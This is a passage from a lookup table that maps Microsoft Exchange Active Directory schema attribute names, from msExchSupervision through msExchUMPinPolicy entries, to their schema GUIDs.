        "msExchSupervisionListMaxLength" = "c324b64d-3385-47d7-b41c-05e7bb173fff";
        "msExchSupervisionOneOffBL" = "be8a9846-efe8-4e6c-90c9-8ccb5ea1965f";
        "msExchSupervisionOneOffLink" = "7ffd33b8-8dbe-4d2a-8df5-6e0ac128c7c7";
        "msExchSupervisionUserBL" = "c6cb00b4-bd08-4ed5-8a94-04884db235bc";
        "msExchSupervisionUserLink" = "3b84dd49-12c9-4416-8858-df64a4a7f810";
        "msExchSupportedSharedConfigBL" = "7e1cc489-9ba3-4be8-9034-b3122ef3c911";
        "msExchSupportedSharedConfigLink" = "91948d3d-d7d5-4213-8d2a-15e025bff255";
        "msExchSyncAccountsFlags" = "808da51e-d726-4c22-8643-c130a3a853c1";
        "msExchSyncAccountsMax" = "29c4ac31-ef1b-4167-b5e9-68ad8ceecb6f";
        "msExchSyncAccountsPoisonAccountThreshold" = "ee9269ed-1eb2-4d86-99a0-83d6116b0379";
        "msExchSyncAccountsPoisonItemThreshold" = "7e22659c-454c-46d9-a26b-f852b647bca6";
        "msExchSyncAccountsPolicy" = "cf75eb66-d980-46bc-86b5-f0574e383fd4";
        "msExchSyncAccountsPolicyDN" = "3711e621-8d45-4d6a-a95f-615230d649c1";
        "msExchSyncAccountsPollingInterval" = "6d83ceaa-ddc8-4300-9d28-014d5840eaad";
        "msExchSyncAccountsSuccessivePoisonItemsThreshold" = "3454d3bc-277b-4ae3-9a01-3ce78318b1ce";
        "msExchSyncAccountsTimeBeforeDormant" = "cd4cb42a-3598-4aa4-bf20-352216318a94";
        "msExchSyncAccountsTimeBeforeInactive" = "3bdda1eb-3ad3-43d2-9dc1-4362ad810cc1";
        "msExchSyncDaemonArbitrationConfig" = "3b8bf1d2-affe-4b22-8780-56fd04886641";
        "msExchSyncDaemonMaxVersion" = "d490765b-2061-4e0b-ae44-32e1d22c2926";
        "msExchSyncDaemonMinVersion" = "1b0fe7b4-434c-487c-9f2b-39f60b2a3d31";
        "msExchSynchronizationDirection" = "20a151f6-b099-11d2-aa06-00c04f8eedd8";
        "msExchSyncHubHealthLogAgeQuotaInHours" = "7a34011b-4b20-4a49-ba4d-c83a46b142a4";
        "msExchSyncHubHealthLogDirectorySizeQuota" = "be7879b3-a857-4467-8201-6bb7cec97a28";
        "msExchSyncHubHealthLogFilePath" = "db3f17ef-9d26-4404-8595-913924fb3fa5";
        "msExchSyncHubHealthLogPerFileSizeQuota" = "81ac633d-ea32-4245-8365-170d3f8197be";
        "msExchSyncLogAgeQuotaInHours" = "8a085c65-57ac-430d-9138-3e6df4dbb2c9";
        "msExchSyncLogDirectorySizeQuota" = "8ea77329-b380-403f-aa1f-eee217016375";
        "msExchSyncLogFilePath" = "1fef6da9-7df1-4108-894b-67753e69cb44";
        "msExchSyncLogLoggingLevel" = "29f53889-1665-4888-81a7-cc218de88912";
        "msExchSyncLogPerFileSizeQuota" = "52382005-d69a-4b29-9d42-48bcddfab9b2";
        "msExchSyncMailboxHealthLogAgeQuotaInHours" = "2b0e4ebb-d0da-414c-ae83-e18107ea5eb2";
        "msExchSyncMailboxHealthLogDirectorySizeQuota" = "a7de7c21-a539-40df-8915-4f027621bfa1";
        "msExchSyncMailboxHealthLogFilePath" = "c5c0786f-6b67-4b16-927f-9787ef110817";
        "msExchSyncMailboxHealthLogPerFileSizeQuota" = "64bf1e2e-50fa-4b64-80c4-c61e1a99af81";
        "msExchSyncMailboxLogAgeQuotaInHours" = "da4720f4-12a6-465d-9e89-66782e9df671";
        "msExchSyncMailboxLogDirectorySizeQuota" = "47a95764-e106-49c8-8d3e-10b62012b8bb";
        "msExchSyncMailboxLogFilePath" = "b3d54062-3582-4e6e-937b-376bdca670ec";
        "msExchSyncMailboxLogLoggingLevel" = "422013b7-e7a8-459c-9dec-29272ce618fa";
        "msExchSyncMailboxLogPerFileSizeQuota" = "d2d67a1c-6690-4965-a118-674b37d2baaa";
        "msExchSystemAddressList" = "22e81fbf-33ec-4a1f-84bf-04c289372f7f";
        "msExchSystemMailbox" = "9cf1aa93-b31c-4725-9d50-ab7ab1d3ca1e";
        "msExchSystemMessageCustomizations" = "bd43a810-4348-459f-bfa4-e1a44bd57259";
        "msExchSystemObjectsContainer" = "0bffa04c-7d8e-44cd-968a-b2cac11d17e1";
        "msExchSystemPolicy" = "ba085a33-8807-4c6c-9522-2cf5a2a5e9c2";
        "msExchSystemPolicyContainer" = "32412a7a-22af-479c-a444-624c0137122e";
        "msExchTargetBridgeheadServersDN" = "20da8a66-b099-11d2-aa06-00c04f8eedd8";
        "msExchTargetServerAdmins" = "7fda5a55-a9cd-469c-a9e0-9ae3c5e730f0";
        "msExchTargetServerPartnerAdmins" = "2a8a9f2d-1f44-4abf-b305-165fe734c703";
        "msExchTargetServerPartnerViewOnlyAdmins" = "16bbcf97-28e3-4ab6-a450-2009c8fccbf7";
        "msExchTargetServerViewOnlyAdmins" = "5cea444c-3f49-4002-80db-ae58aa7fb812";
        "msExchTemplateRDNs" = "211fae98-b099-11d2-aa06-00c04f8eedd8";
        "msExchTenantPerimeterSettings" = "8e11a5b0-5428-4d27-bea6-4dbac4f17ebe";
        "msExchTenantPerimeterSettingsFlags" = "4e30517f-9074-4222-9166-e94c65b81dfa";
        "msExchTenantPerimeterSettingsGatewayIPAddresses" = "9d4a3e3e-c73d-416b-a801-eec59b48619a";
        "msExchTenantPerimeterSettingsInternalServerIPAddresses" = "9580534f-48a6-48f6-925b-67f4a46d81c8";
        "msExchTenantPerimeterSettingsOrgID" = "da93e895-5dab-4e16-92ca-4a791fcdc067";
        "msExchTextMessagingState" = "eec53940-442f-4815-bbc1-12e3b44775cd";
        "msExchThirdPartySynchronousReplication" = "502d89ae-5a6d-4d9d-a1d7-18fe33978199";
        "msExchThrottlingIsDefaultPolicy" = "51c80e5a-ad2e-4053-88db-74747b523468";
        "msExchThrottlingPolicy" = "969ecdf1-a388-4f73-80a5-56a9acc4cde7";
        "msExchThrottlingPolicyDN" = "8f87a4fd-0dc1-4b99-8b72-a7fad4d25c1d";
        "msExchTlsAlternateSubject" = "872a2c26-e51f-4e17-ac2e-af91c0247e08";
        "msExchTLSReceiveDomainSecureList" = "63aafa32-0469-4780-8124-0b6f6e6504e5";
        "msExchTLSSendDomainSecureList" = "3284b770-0959-4373-9529-c57c071f2986";
        "msExchTPDCSPName" = "1f0c5c1b-00fd-4de3-8b16-cdb4e9a344f7";
        "msExchTPDCSPType" = "4ca7c802-f109-4e02-800d-d4162bc72884";
        "msExchTPDDisplayName" = "66d94ddc-0104-4b49-b806-9e16cc3ce308";
        "msExchTPDExtranetCertificationUrl" = "0738ddc6-6246-412d-8405-f8b39b15b1c9";
        "msExchTPDExtranetLicensingUrl" = "4894e6b8-4af7-4705-b86f-9354c66751b3";
        "msExchTPDFlags" = "4497b9e9-9ae2-4118-91cf-76a76fee4ef1";
        "msExchTPDIntranetCertificationUrl" = "ee4ff29d-c626-40e3-89ec-9776c949c703";
        "msExchTPDIntranetLicensingUrl" = "9cd27f97-fd3b-4fbf-b093-ed6589b43363";
        "msExchTPDKeyContainerName" = "f04e3ad3-a551-447d-a591-e535c5a6c8ab";
        "msExchTPDKeyID" = "4b0a7d31-5d57-4633-8578-10b6c0c09b6c";
        "msExchTPDKeyIDType" = "3cbb6448-c376-4f91-9ae8-2a64b35b1a39";
        "msExchTPDKeyNumber" = "507dc7fa-1749-46f0-84c5-8abd17ca278f";
        "msExchTPDPrivateKey" = "ed1126a2-fe48-42ff-9a88-d09d13a48a85";
        "msExchTPDSLCCertificateChain" = "64c9c6ec-82de-462e-ac9c-71e9280fda99";
        "msExchTPDTemplates" = "d32ae889-d44b-41ef-8d7a-6bf98bb2661c";
        "msExchTrackDuplicates" = "2196e42c-b099-11d2-aa06-00c04f8eedd8";
        "msExchTransportConnectivityLogDirectorySize" = "6bb358b3-96c3-4d49-a527-5a2dafb7d29f";
        "msExchTransportConnectivityLogFileSize" = "f28849f1-b727-4875-9631-a4d77a71ac8e";
        "msExchTransportConnectivityLogPath" = "2c8be23b-891c-4d6a-95c4-aaaccf3718ab";
        "msExchTransportDelayNotificationTimeout" = "82906765-40e3-4720-b6b4-c4edd2c884bb";
        "msExchTransportDeliveryAgentDeliveryProtocol" = "ed876760-4e9a-4dbb-b5e3-8ce67c34a560";
        "msExchTransportDeliveryAgentMaxConcurrentConnections" = "ae771ff9-0149-4092-b773-60f397aefda4";
        "msExchTransportDeliveryAgentMaxMessagesPerConnection" = "b33a4a54-6c1e-4357-8c5a-7807d2b0cf97";
        "msExchTransportDropDirectoryName" = "084e4326-a763-4924-b195-23266387881e";
        "msExchTransportDropDirectoryQuota" = "15e02a32-1b7d-4112-8b3b-6fe3ec8050a7";
        "msExchTransportExternalDefaultLanguage" = "d24029fa-c2a4-4096-923c-aa3eda67997c";
        "msExchTransportExternalDNSAdapterGuid" = "ea8711d6-cd4e-4393-872e-cd51b94e4f61";
        "msExchTransportExternalDNSProtocolOption" = "9c29a174-2ea1-45ab-a4ee-053c0ed6cf2c";
        "msExchTransportExternalDSNReportingAuthority" = "efa0fc2f-d57c-46ca-ba9d-075de4d18c8b";
        "msExchTransportExternalIPAddress" = "1f540f8b-1556-4234-a7f1-9a7fbcd58f53";
        "msExchTransportExternalMaxDSNMessageAttachmentSize" = "77d38312-37bf-4a45-aefb-7bb420e9bbdb";
        "msExchTransportExternalPostmasterAddress" = "96c984d5-35a1-4fcb-af00-df0fa34563a0";
        "msExchTransportExternalTrustedServers" = "052ed1e9-c417-4503-a805-327b48daa4ca";
        "msExchTransportFlags" = "da21ac8d-71ca-4781-93c4-1ba2e0696abe";
        "msExchTransportInboundSettings" = "6f4478eb-8832-4174-9912-33d33968484f";
        "msExchTransportInternalDefaultLanguage" = "73b7aa28-c725-4a63-9f07-360e67797bcc";
        "msExchTransportInternalDNSAdapterGuid" = "580a335c-f4a4-48c7-8428-45983f925810";
        "msExchTransportInternalDNSProtocolOption" = "e311eaea-dc16-410b-9f4e-74de2c64fcd2";
        "msExchTransportInternalDNSServers" = "bbcba5ac-98f4-4db2-b00d-5f4634673dd1";
        "msExchTransportInternalDSNReportingAuthority" = "2597b9d5-553d-4a08-b9ad-1b7a06ab4496";
        "msExchTransportInternalMaxDSNMessageAttachmentSize" = "661c7a76-2c6f-49ca-9839-f170cf000d52";
        "msExchTransportInternalPostmasterAddress" = "2401fe52-c440-4106-88e0-c738112ee6e1";
        "msExchTransportIntraTenantMailContentType" = "e67ff0db-2e94-4c1e-8436-f0ab1b61a549";
        "msExchTransportMaxConcurrentMailboxDeliveries" = "c52f01fd-2c29-4dba-8266-1a5b24354958";
        "msExchTransportMaxConcurrentMailboxSubmissions" = "cd55cb2c-9bb4-4e7b-bccd-3125e5880a27";
        "msExchTransportMaxConnectivityLogAge" = "90e8e933-a32a-495e-a1fc-e272f1d59eff";
        "msExchTransportMaxMessageTrackingDirectorySize" = "237db0aa-e613-45d0-b9cb-1d48d756f973";
        "msExchTransportMaxMessageTrackingFileSize" = "3bdbc26d-4f49-4103-b554-683eba655f16";
        "msExchTransportMaxMessageTrackingLogAge" = "bbc58701-4e17-491d-b4bc-f82e54e97c11";
        "msExchTransportMaxPickupDirectoryHeaderSize" = "415956f5-86f9-45ed-bce8-c7f3b209a434";
        "msExchTransportMaxPickupDirectoryMessageSize" = "0137dcec-dbe4-4f92-aced-594baaca0cad";
        "msExchTransportMaxPickupDirectoryMessagesPerMinute" = "ac791a68-0ded-4fba-b53f-2cc9f49c3439";
        "msExchTransportMaxPickupDirectoryRecipients" = "cff6ab55-e291-4f2f-9c01-e0224bd27c89";
        "msExchTransportMaxQueueIdleTime" = "9d4bc004-9626-4e5c-8065-2bdc5e9dd70d";
        "msExchTransportMaxReceiveProtocolLogAge" = "672e6c8b-c8a6-446f-9667-0434c1364268";
        "msExchTransportMaxReceiveProtocolLogDirectorySize" = "2edc6de8-17d4-4503-9541-59ecfd6591ff";
        "msExchTransportMaxReceiveProtocolLogFileSize" = "285ac9be-d698-4f63-b55d-23e1c103cc4d";
        "msExchTransportMaxRecipientStatisticsLogAge" = "c08ba8b6-69f0-415a-ba22-0c2e2b20e842";
        "msExchTransportMaxSendProtocolLogAge" = "d9df725c-59dd-483b-bb9b-136b0b06d79e";
        "msExchTransportMaxSendProtocolLogDirectorySize" = "bfc689f2-6cf3-4a2c-805a-ced61f5ad4c0";
        "msExchTransportMaxSendProtocolLogFileSize" = "3526af44-f92c-4fbf-a156-9174b19e29eb";
        "msExchTransportMaxServerStatisticsLogAge" = "c49ab3a8-fcc7-4385-9629-22b9eb474d51";
        "msExchTransportMessageExpirationTimeout" = "3f370881-7631-463f-a9ec-5ef2419a99a7";
        "msExchTransportMessageRetryInterval" = "e088074e-94eb-4f56-a290-ba7904cb0ff3";
        "msExchTransportMessageTrackingPath" = "85e6cb8c-7650-46b6-be40-0212f3908684";
        "msExchTransportOutboundConnectionFailureRetryInterval" = "9f9307e1-61a6-44fe-82fd-317d7ab5a4cb";
        "msExchTransportOutboundProtocolLoggingLevel" = "d275e368-c7d7-48c6-be74-0d368e6ef376";
        "msExchTransportOutboundSettings" = "c854cf23-7167-4029-9834-e72fab2db919";
        "msExchTransportPartnerConnectorDomain" = "dbc826a6-ae28-4503-a83e-67ecb70dc0a5";
        "msExchTransportPartnerRoutingDomain" = "20aa4f62-a296-4e16-8b6b-0438986a81c6";
        "msExchTransportPerQueueMessageDehydrationThreshold" = "0212ed3a-b0c9-47b8-b49f-6dffcd673504";
        "msExchTransportPickupDirectoryPath" = "33e5848b-7424-4170-9e8c-c90ce0d4a765";
        "msExchTransportPipelineTracingPath" = "681e59f0-da7e-4ce7-b790-8c380ad0fc1a";
        "msExchTransportPipelineTracingSenderAddress" = "857cf6eb-be54-47f0-b553-bd8163503317";
        "msExchTransportPoisonMessageThreshold" = "1883a897-0de5-4fe1-95f2-570c74c04642";
        "msExchTransportReceiveProtocolLogPath" = "671678de-d55d-4b6e-b3ff-900a6301cf02";
        "msExchTransportRecipientSettingsFlags" = "a762a99b-30eb-42c3-ba5e-521b5a017734";
        "msExchTransportRecipientStatisticsDirectorySize" = "7365af57-6829-45e9-9eba-2c6f77136762";
        "msExchTransportRecipientStatisticsFileSize" = "9c40d725-8a64-40de-ac59-632ede8e6b0b";
        "msExchTransportRecipientStatisticsPath" = "11e9ea4b-79af-4076-ab59-904d2baaec1e";
        "msExchTransportReplayDirectoryPath" = "181757c7-e7aa-44f4-9698-2ef5db09797c";
        "msExchTransportResellerIntraTenantMailContentType" = "2bf3c9c7-0610-46ec-87e1-86e5feac7d59";
        "msExchTransportResellerSettings" = "b1b0cbaf-ea35-4648-bf56-3f916a38fdae";
        "msExchTransportResellerSettingsInboundGatewayID" = "283da14c-9f01-4cc7-9dd0-5cc4aa5a2abc";
        "msExchTransportResellerSettingsLink" = "a8edc6e1-c350-458a-9a0c-69c17b68e910";
        "msExchTransportResellerSettingsOutboundGatewayID" = "e8520adf-c0d3-456d-a215-69c4ef342532";
        "msExchTransportRootDropDirectoryPath" = "5ead7d97-6156-4649-b6ca-fa650e30323f";
        "msExchTransportRoutingLogMaxAge" = "52258c5c-49aa-4d3a-a3f5-e7343c0411c6";
        "msExchTransportRoutingLogMaxDirectorySize" = "ca6b2c83-eb6c-4164-a5c4-54ebfe34417f";
        "msExchTransportRoutingLogPath" = "1e94d6db-cc7b-42cb-a51d-145f1a8e0eae";
        "msExchTransportRule" = "fb031bae-baac-4599-8e29-2710df94fa0c";
        "msExchTransportRuleCollection" = "2230472b-4dc2-46af-9eb9-48f85e86471b";
        "msExchTransportRulePriority" = "fb7c3663-bc2c-4bf7-820e-03d6d481e95d";
        "msExchTransportRuleXml" = "fa601087-d9bd-4f29-be0f-adedf92d43e7";
        "msExchTransportSecurityDescriptor" = "65afdd90-33ad-4f6f-9f17-29b998c38957";
        "msExchTransportSendProtocolLogPath" = "3ec000d9-6b24-4445-a311-313635de352c";
        "msExchTransportServerStatisticsDirectorySize" = "97dbb3b9-3c29-4754-a412-bce002444adc";
        "msExchTransportServerStatisticsFileSize" = "1360d92f-dc05-4ecd-9978-08e85fc011ad";
        "msExchTransportServerStatisticsPath" = "3d83b9f4-a6dc-4ce4-a098-59c9350a9fdd";
        "msExchTransportSettings" = "7dc6b928-c5e8-438a-88b5-5e61551297b0";
        "msExchTransportSettingsAVFlags" = "f19747b6-26df-464a-acce-2dddf180107a";
        "msExchTransportSettingsFlags" = "3ba5dfa9-f7b8-499f-a542-4758f82ba14c";
        "msExchTransportShadowHeartbeatRetryCount" = "b6c9052b-1e56-4d2f-82d2-f66db3ab95ec";
        "msExchTransportShadowHeartbeatTimeoutInterval" = "0b178d0c-c583-4561-8ae1-0996ff080b6b";
        "msExchTransportShadowMessageAutoDiscardInterval" = "f083a286-a677-4711-ae0a-4f2f6a7d5c9c";
        "msExchTransportSiteFlags" = "9d87b436-f668-4887-97a6-792aa77d87be";
        "msExchTransportSubmissionServerOverrideList" = "68a1fa12-91fc-4ea7-954d-bdfa3fdeabcb";
        "msExchTransportTotalQueueMessageDehydrationThreshold" = "20c11750-d1f0-4240-b832-50726b6f351c";
        "msExchTransportTransientFailureRetryCount" = "41a4579e-4db4-43a3-9319-4b537b4e30f3";
        "msExchTransportTransientFailureRetryInterval" = "dd308d84-d88f-4005-81e0-e89c9b9778a2";
        "msExchTrkLogCleaningInterval" = "21d27ef6-b099-11d2-aa06-00c04f8eedd8";
        "msExchTruncationLag" = "0ed9df2d-bcdd-467e-8f90-ffc8473361ff";
        "msExchTUIPassword" = "567d521f-2f6a-11d3-aa6c-00c04f8eedd8";
        "msExchTUISpeed" = "567d522a-2f6a-11d3-aa6c-00c04f8eedd8";
        "msExchTUIVolume" = "567d5225-2f6a-11d3-aa6c-00c04f8eedd8";
        "msExchTurfList" = "8b60f7f8-b09e-11d2-aa06-00c04f8eedd8";
        "msExchTurfListAction" = "0b836daa-3b20-11d3-aa6f-00c04f8eedd8";
        "msExchTurfListNames" = "0b836da0-3b20-11d3-aa6f-00c04f8eedd8";
        "msExchTurfListOptions" = "01dbe64c-bfeb-47cd-9939-8911946bdd6d";
        "msExchUce" = "c5ccdce1-b399-405f-8ab7-bc6434d2e422";
        "msExchUceBlockThreshold" = "9f297c14-d715-4631-a259-bf51dc52eac1";
        "msExchUceEnabled" = "15e2db2e-7206-4109-9b94-830f4def1b05";
        "msExchUceStoreActionThreshold" = "44ccbd60-6ede-46f0-8f13-931a9bb5b8e8";
        "msExchUCVoiceMailSettings" = "b17c00b8-46b9-484e-b053-d5c26835f11e";
        "msExchUMAddresses" = "186df8d8-57bc-46a0-b9cd-74888f8eb1e5";
        "msExchUMAllowedInCountryGroups" = "c7ed0e7c-1caa-42aa-9fa3-9c7986d472e3";
        "msExchUMAllowedInternationalGroups" = "bfe9de74-78aa-4828-9507-2d5395f2fa58";
        "msExchUMASREnabled" = "39872559-7b5e-425f-8623-95e14cc4fb15";
        "msExchUMAudioCodec" = "e9fc3238-446f-4558-b74f-6261c7d44567";
        "msExchUMAudioCodec2" = "b1c78c4e-fa13-4b90-9832-bb65dd0d2845";
        "msExchUMAutoAttendant" = "a0849bf5-7741-4422-a22d-ae8b08e156df";
        "msExchUMAutoAttendantAfterHourFeatures" = "0d9d9da7-3864-4149-b958-798abd1d952f";
        "msExchUMAutoAttendantBusinessHourFeatures" = "2c89524d-373c-41aa-a764-fc29ffb08ffc";
        "msExchUMAutoAttendantBusinessHourSchedule" = "65a0c330-8beb-4817-b425-46d3c3c278b9";
        "msExchUMAutoAttendantDialedNumbers" = "8c7ac62e-e9cc-4d34-b20e-c5890a52d616";
        "msExchUMAutoAttendantDialPlanBL" = "e53ba257-1d00-4265-9f21-9dc2cb30feb2";
        "msExchUMAutoAttendantDialPlanLink" = "1e407dcd-7554-4acc-9ad7-db001dc99542";
        "msExchUMAutoAttendantFlags" = "a33ae847-be13-43c9-ab96-036423eeeb0e";
        "msExchUMAutoAttendantHolidaySchedule" = "ebc6522f-5afe-4d6b-a43c-b35d5cf4218e";
        "msExchUMAutoAttendantPromptChangeKey" = "73dc1901-8d70-4e4a-97ad-e7cc1934b712";
        "msExchUMAutoAttendantTimeZone" = "29b0f6f8-d62b-4b5f-b688-e71ab2ca9a87";
        "msExchUMAvailableInCountryGroups" = "d80a776c-a126-4631-8c80-b44f4c2c886e";
        "msExchUMAvailableInternationalGroups" = "76a0afa7-7081-4852-a000-f39e73f2a73d";
        "msExchUMAvailableLanguages" = "04000bd4-0a40-497c-a062-fedaaa2833ae";
        "msExchUMAvailableTTSLanguages" = "d3b17b08-0454-47df-bf88-73dfe8b7f8f8";
        "msExchUMBusinessLocation" = "9f6445b5-5ae8-46d0-80c3-97d7110b2d22";
        "msExchUMBusinessName" = "f40632a8-1599-4a48-aeb4-ca2c1e7ed928";
        "msExchUMCallFailuresToDisconnect" = "25ecfbc0-3dd2-4c6a-80fa-3e48378b9557";
        "msExchUMCallingLineIDFormats" = "7ab997c0-d10a-47ee-b45d-d79cce0b4eee";
        "msExchUMCallingLineIDs" = "1645ee1b-cc21-401f-97d2-164a78773013";
        "msExchUMCallSomeoneEnabled" = "d3efed30-67d2-4719-b9cd-3cb3c95a9663";
        "msExchUMCallSomeoneScope" = "4ab4a2dc-6cc5-4879-bc8b-1e8cd082472d";
        "msExchUMCertificateThumbprint" = "f5b4d77b-dc07-41a5-add1-05c0fc7601b6";
        "msExchUMCountryCode" = "53f7c905-e94e-4983-95a2-16ec92218da5";
        "msExchUMDefaultLanguage" = "27966da7-4eca-464d-b8ff-803035aa20de";
        "msExchUMDefaultMailbox" = "6fd0b452-3b96-4a04-a09e-55edc06e5282";
        "msExchUMDefaultOutboundCallingLineID" = "7c26f336-6f56-4cde-9c3f-d5149f7d186c";
        "msExchUMDefaultTTSLanguage" = "c02b3c2a-f405-413b-9d9b-888f0bf55af1";
        "msExchUMDialByNamePrimary" = "d5cc2eee-3216-47e3-a68c-dcb89941d210";
        "msExchUMDialByNameSecondary" = "a58ef719-194e-4aa6-8dc5-7241de1534b7";
        "msExchUMDialPlan" = "df0fd94f-126f-42bd-a02f-aa0bac5a31d7";
        "msExchUMDialPlanDefaultAutoAttendantBL" = "1abc4444-148f-4a56-aac9-15ede8ec2371";
        "msExchUMDialPlanDefaultAutoAttendantLink" = "9866d5ba-7bd9-459f-9fb4-6b222101559b";
        "msExchUMDialPlanDialedNumbers" = "14f61519-0a53-414f-8976-69dcc81f35af";
        "msExchUMDialPlanFlags" = "4d7863e2-0225-43f4-94d7-38ae544d1986";
        "msExchUMDialPlanFlags2" = "346bccf7-9e04-4170-bc14-5d08bb9db519";
        "msExchUMDialPlanPromptChangeKey" = "4921466a-0e39-4c89-8998-a2e811a6422e";
        "msExchUMDialPlanSubscribersAllowed" = "1fa2724e-c041-465c-9b28-437592f46d2e";
        "msExchUMDialPlanSubscriberType" = "43260d82-0bfa-4f79-92f1-48c7da87de4a";
        "msExchUMDialPlanTimezone" = "445f3571-b0ff-4fb5-9f18-fc0e3ac9056d";
        "msExchUMDialPlanURIType" = "24359755-64c6-4cb2-8a66-3b0ea6b2d14a";
        "msExchUMDialPlanVoipSecurity" = "1ce9e84d-9e00-47cf-8175-79bd6ac45f65";
        "msExchUMDisambiguationField" = "c7e4d7e8-51c9-478a-b47e-7c494f415a84";
        "msExchUMDTMFFallbackAutoAttendantBL" = "4126c33f-8f2b-41e2-a41e-856ba598b8f0";
        "msExchUMDTMFFallbackAutoAttendantLink" = "d0101a82-3762-41cb-952a-92b76f3188c3";
        "msExchUMDtmfMap" = "614aea82-abc6-4dd0-a148-d67a59c72816";
        "msExchUMEnabledFlags" = "2d485eee-45e1-4902-add1-5630d25d13c2";
        "msExchUMEnabledFlags2" = "1b694237-473d-40a1-8fd6-24b0d4d5e543";
        "msExchUMEnabledText" = "794da169-b990-4a36-800a-778cc544fe96";
        "msExchUMEquivalenceDialPlan" = "81884566-dd95-4e2a-add4-81886429fc37";
        "msExchUMEquivalentDialPlanPhoneContexts" = "1b789576-7616-4964-b1e5-f1ce4bd14f76";
        "msExchUMExtensionLengthNumbersAllowed" = "e3a943d5-1455-48a3-81f5-682791acd0df";
        "msExchUMFaxEnabled" = "2abd9bd9-c06d-4dd7-9f77-76e46f6c35bb";
        "msExchUMFaxId" = "dcac508b-52c4-4cf8-b0be-fa9a422a492a";
        "msExchUMFaxMessageText" = "d4682ca4-be37-4810-80b1-817b9bb7aa54";
        "msExchUMFaxServerURI" = "0cf8ac45-f6e3-4d95-8dd0-886010210a90";
        "msExchUMForwardingAddressTemplate" = "1d26dfdf-c256-4788-85a0-31c98093abb0";
        "msExchUMGlobalCallRoutingScheme" = "ffbf89f2-39c1-4841-bd74-aac76b2691da";
        "msExchUMGrammarGenerationSchedule" = "7aa1de79-8152-4570-8362-709d2044ba67";
        "msExchUMHuntGroup" = "0b41a421-8532-4a93-b1e3-aa0466c0c545";
        "msExchUMHuntGroupDialPlanBL" = "cdccf74c-aa82-402b-a867-6d3ed1f646ec";
        "msExchUMHuntGroupDialPlanLink" = "db87dade-2355-451b-866e-874bdab991b3";
        "msExchUMHuntGroupNumber" = "98d10a9f-7284-4ec5-a71d-e991814f16a0";
        "msExchUMInCountryNumberFormat" = "ee86a892-9d7d-4d13-b62a-ba977ed40fa4";
        "msExchUMInfoAnnouncementFile" = "278cc83b-86f0-4d5a-9c39-a5c7bb4a5374";
        "msExchUMInfoAnnouncementStatus" = "4de0da5f-5999-49bf-94c7-62c0d3c8b440";
        "msExchUMInputRetries" = "420ee35e-9c09-40e7-87e2-96576f1288bf";
        "msExchUMInputTimeout" = "6f0a488e-2b67-4b73-928e-63978c5f01c5";
        "msExchUMInternationalAccessCode" = "e5d4865f-e398-4723-8b82-6757bd0e87a4";
        "msExchUMInternationalNumberFormat" = "2171fdad-a153-4d30-ba8e-c61114040f0e";
        "msExchUMIPGateway" = "2f786350-069f-46a1-a4a2-a92bbc541915";
        "msExchUMIPGatewayAddress" = "f6c99325-c9ac-4621-803a-1686fa91f80d";
        "msExchUMIPGatewayDialPlanBL" = "adca03c2-812a-4bfa-8893-5e9245b4bbcd";
        "msExchUMIPGatewayDialPlanLink" = "8b6ce8ad-6277-451e-bb55-d3be3bcf2e09";
        "msExchUMIPGatewayFlags" = "e90e1596-b180-4b6c-ba5d-56df9756221c";
        "msExchUMIPGatewayFlags2" = "266dad64-474d-4566-af9b-7218d32fa128";
        "msExchUMIPGatewayPort" = "4582535e-3200-4cc6-8213-6e463dd5bd42";
        "msExchUMIPGatewayServerBL" = "d4cfc428-bb85-47aa-8ec1-278ceac88d68";
        "msExchUMIPGatewayServerLink" = "dd25ebf7-f122-4aab-a329-91721632e3fb";
        "msExchUMIPGatewayStatus" = "c52024d1-0ec8-47c6-bf01-552aaf5ce5b5";
        "msExchUMListInDirectorySearch" = "82408606-c95f-4a2f-a5d8-5bfc5b8d4454";
        "msExchUMLoadBalancerFQDN" = "15187b7d-6b61-494d-ae2f-3dddd489d784";
        "msExchUMLogonFailuresBeforeDisconnect" = "25b9bc6b-9dbc-43ce-a23d-cbf05a70f3de";
        "msExchUMLogonFailuresBeforePINReset" = "74bc3ecb-d7ae-4ae4-b333-4cd2015def9a";
        "msExchUMMailboxOVALanguage" = "1d2c9e74-2d99-425a-b716-b58ec3029579";
        "msExchUMMailboxPolicyDialPlanBL" = "40d8e068-45e2-46b8-b4f9-c5947a712bae";
        "msExchUMMailboxPolicyDialPlanLink" = "a1d0c37e-190c-4c3e-8d89-ad5cdfeaf154";
        "msExchUMMaxCallDuration" = "e1c0b4e1-f7b4-4835-91a9-868e09654581";
        "msExchUMMaxGreetingDuration" = "aaf0f4ba-6575-4ad1-bacc-bb8555633acf";
        "msExchUMMaximumASRSessionsAllowed" = "7e9b836f-c72a-4ca4-9145-4e1ada4da043";
        "msExchUMMaximumCallsAllowed" = "2d3fe625-6f64-4c35-ad11-e3a7a2edfcc2";
        "msExchUMMaximumFaxCallsAllowed" = "da7b007c-9a9d-4f1e-b1e9-a36f13e7d80f";
        "msExchUMMaximumTTSSessionsAllowed" = "d545bc47-f737-4b36-93ef-1190a3107f52";
        "msExchUMMaxRecordingDuration" = "9d8d29c0-035e-4ede-a92d-4d49bfebec1d";
        "msExchUMMissedCallText" = "1b030331-f01c-4b1f-b7ff-28ab13f1092d";
        "msExchUMNationalNumberPrefix" = "7baaf723-7088-4d0f-b44b-df54da6689a4";
        "msExchUMNDRReqEnabled" = "4b957237-17aa-41ac-91ea-c10abb2aaadf";
        "msExchUMNumberingPlanDigits" = "22249203-2d28-47eb-908a-0eeba73c7846";
        "msExchUMOperatorExtension" = "844d4cfe-f6c9-465c-8ae5-a29a7ee6eb75";
        "msExchUMOperatorNumber" = "8430c102-39d3-4162-8db3-2edf25cd72fc";
        "msExchUMOutcallsAllowed" = "613b0b02-2659-44ed-bcec-b65fbe6ddbe4";
        "msExchUMOverrideExtension" = "871e9fe9-f0a9-4f3d-a41e-c50a287ffa18";
        "msExchUMPhoneContext" = "ce73e8d2-a5fb-4726-872f-8c5c5ed93fd9";
        "msExchUMPhoneProvider" = "a70b57d8-b3f0-49bc-aed8-b128572dd704";
        "msExchUMPilotIdentifier" = "8e035619-633d-41c8-857e-7bc1b4523ece";
        "msExchUMPinChecksum" = "3263e3b8-fd6b-4c60-87f2-34bdaa9d69eb";
        "msExchUMPinPolicyAccountLockoutFailures" = "7cd75e34-4eed-4c36-9072-c2a56ace2653";
        "msExchUMPinPolicyDisallowCommonPatterns" = "0b0bb4db-2314-498e-b31d-a2b35c728785";
        "msExchUMPinPolicyExpiryDays" = "fd574ebb-3a5a-4eb6-bb0d-9871f5f0f3a8";
